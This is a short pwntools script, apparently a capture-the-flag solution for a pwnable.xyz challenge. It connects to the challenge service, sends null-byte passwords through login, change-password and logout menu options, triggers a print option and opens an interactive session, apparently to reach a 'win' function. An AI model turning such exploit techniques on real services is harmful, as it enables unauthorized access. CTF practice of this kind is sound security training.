from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30026)
win = e.symbols['win']
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def login(password):
	sla('>','1')
	sa(':',password)

def change(password):
	sla('>','2')
	sa(': \n',password)

def printf():
	sla('>','3')

def logout():
	sla('>','4')

sa(':','1234') # User ID:
login('\x00')
change('\x00')
logout()
printf()

p.interactive()